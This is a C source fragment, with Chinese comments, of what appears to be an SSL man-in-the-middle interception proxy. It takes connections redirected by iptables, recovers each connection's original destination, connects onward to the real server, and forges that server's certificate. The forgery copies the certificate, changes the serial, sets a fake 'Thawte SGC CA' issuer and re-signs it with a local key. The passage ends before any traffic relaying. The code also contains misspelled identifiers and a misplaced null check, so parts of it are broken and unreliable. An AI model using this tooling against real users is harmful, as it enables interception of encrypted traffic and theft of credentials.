#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <linux/netfilter_ipv4.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define LISTEN_BACKLOG  50
#define warning(msg) \
    do { fprintf(stderr, "%d, ", sum); perror(msg); } while ( 0 )
#define error(msg)  \
    do { fprintf(stderr, "%d, ", sum); perror(msg); } while ( 0 )

int sum = 1;
struct timeval timeout = { 0, 10000000 };

int get_socket_to_server(struct sockaddr_in* original_server_addr)
{
    int sockfd;
    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
        error("Fail to initial socket to server!");
    if ( connect(sockfd, (struct sockaddr*)orginal_server_addr, sizeof(struct sockaddr)) < 0 )
        error("Fail to connect to server!\n");
    printf("%d, connect to server [%s:%d]\n", sum, inet_ntoa(original_server_addr->sin_addr), ntohs(original_server_addr->sin_port));

    return sockfd;
}

//监听指定端口，等待客户端连接
int socket_to_client_init(short int port)
{
    int sockfd;
    int on = 1;
    struct sockaddr_in addr;

    //初始化一个socket
    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
        error("Fail to initial socket to client!\n");
    if ( setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on)) < 0 )
        error("reuseaddr error!\n");
    memset(&addr, 0, sizeof(addr));
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_family = AF_INET;
    //将该socket绑定到8888端口上
    addr.sin_port = htons(port);
    if ( bind(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0 )
    {
        shutdown(sockfd, SHUT_RDWR);
        error("Fail to bind socket to client!");
    }

    //然后监听该端口
    if ( listen(sockfd, LISTEN_BACKLOG) < 0 )
    {
        shutdown(sockfd, SHUT_RDWR);
        error("Fail to listen socket to client!");
    }

    return sockfd;
}

//当主机B发起一个ssl连接时，我们在本地8888端口就可以监听到连接，这是我们接受这个连接，并获得
//该连接的原始目的地址，以便后续连接服务器时使用。该部分封装到了get_socket_to_client函数中
int get_socket_to_client(int socket, struct sockaddr_in* original_server_addr)
{
    int client_fd;
    struct sockaddr_in client_addr;
    socklen_t client_size = sizeof(struct sockaddr);
    socklen_t server_size = sizeof(struct sockaddr);

    memset(&client_addr, 0, client_size);
    memset(original_server_addr, 0, server_size);
    client_fd = accept(socket, (struct sockaddr*)&client_addr, &client_size);
    if ( client_fd < 0 )
    {
        warning("Fail to accept socket to client!");
        return -1;
    }

    //通过getsockopt函数获得socket中的SO_ORIGINAL_DST属性，得到报文被iptables重定向之前的原始目的地址。
    //使用SO_ORIGINAL_DST属性需要包括头文件<linux/netfilter_ipv4.h>。
    //值得注意的是，在当前的情景下，通过getsockname等函数是无法正确获得原始的目的地址的，
    //因为iptables在重定向报文到本地端口时，已经将IP报文的目的地址修改为本地地址，
    //所以getsockname等函数获得的都是本地地址而不是服务器的地址。
    if ( getsockopt(client_fd, SOL_IP, SO_ORIGINAL_DST, original_server_addr, &server_size) < 0 )
        warning("Fail to get original server address of socket to client!");
    printf("%d, Find SSL connection from client [%s:%d]", sum, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
    printf(" to server [%s:%d]\n", inet_ntoa(original_server_addr->sin_addr), ntohs(original_server_addr->sin_port));

    return client_fd;
}

//初始化openssl库
void SSL_init()
{
    SSL_library_init();
    SSL_load_error_strings();
}

void SSL_Warning(char *custom_string)
{
    char error_buffer[256] = {0};

    fprintf(stderr, "%d, %s", sum, custom_string);
    ERR_error_string(ERR_get_error(), error_buffer);
    fprintf(stderr, "%s\n", error_buffer);
}

void SSL_Error(char *custom_string)
{
    SSL_Warning(custom_string);
    exit(EXIT_FAILURE);
}

//在与服务器建立了socket连接之后，我们就可以建立SSL连接了。
//这里我们使用linux系统中著名SSL库openssl来完成我们接下来的工作
SSL* SSL_to_server_init(int socket)
{
    SSL_CTX* ctx;

    ctx = SSL_CTX_new(SSLv23_client_method());
    if ( ctx == NULL )
        SSL_Error("Fail to init ssl ctx!");
    SSL* ssl = SSL_new(ctx);
    if ( ssl == NULL )
        SSL_Error("Create ssl error");
    if ( SSL_set_fd(ssl, socket) != 1 )
        SSL_Error("Set fd error");

    return ssl;
}

SSL* SSL_to_client_init(int socket, X509 *cert, EVP_PKEY *key)
{
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(SSLv23_server_method());
    if ( ctx == NULL )
        SSL_Error("Fail to init ssl ctx!");

    if ( cert && key )
    {
        if ( SSL_CTX_use_certificate(ctx, cert) != 1 )
            SSL_Error("Certificate error");
        if ( SSL_CTX_use_PricateKey(ctx, key) != 1 )
            SSL_Error("key error");
        if ( SSL_CTX_check_private_key(ctx) != 1 )
            SSL_Error("Private key does not match the certificate public key");
    }

    SSL *ssl = SSL_new(ctx);
    if ( ssl == NULL )
        SSL_Error("Create ssl error");
    if ( SSL_set_fd(ssl, socket) != 1 )
        SSL_Error("set fd error");

    return ssl;
}

void SSL_terminal(SSL *ssl)
{
    SSL_CTX *ctx = SSL_get_SSL_CTX(ssl);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    if ( ctx )
        SSL_CTX_free(ctx);
}

//从文件读取伪造ssl证书时需要的RAS私钥和公钥
EVP_PKEY* create_key()
{
    EVP_PKEY *key = EVP_PKEY_new();
    RSA* rsa = RSA_new();

    FILE *fp;
    if ( (fp = fopen("private.key", "r")) == NULL )
        error("private.key");
    PEM_read_RSAPrivateKey(fp, &rsa, NULL, NULL);

    if ( (fp = fopen("public.key", "r")) == NULL )
        error("public.key");
    PEM_read_RSAPublicKey(fp, &rsa, NULL, NULL);

    EVP_PKEY_assign_RSA(key, rsa);

    return key;
}

X509* create_fake_certificate(SSL* ssl_to_server, EVP_PKEY *key)
{
    unsigned char buffer[128] = {0};
    int length = 0, loc;
    X509 *server_x509 = SSL_get_peer_certificate(ssl_to_server);
    X509 *fake_x509 = X509_dup(server_x509);
    if ( server_x509 == NULL )
        SSL_Error("Fail to get the certificate from server!");

    X509_set_version(fake_x509, X509_get_version(server_x509));
    ASN1_INTEGER *a = X509_get_serialNumber(fake_x509);
    a->data[0] = a->data[0] + 1;
    X509_NAME *issuer = X509_NAME_new();
    X509_NAME_add_entry_by_txt(issuer, "CN", MBSTRING_ASC, "Thawte SGC CA", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "O", MBSTRING_ASC, "Thawte Consulting (Pty) Ltd.", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "OU", MBSTRING_ASC, "Thawte SGC CA", -1, -1, 0);
    X509_set_issuer_name(fake_x509, issuer);
    X509_sign(fake_x509, key, EVP_sha1());

    return fake_x509;
}

//
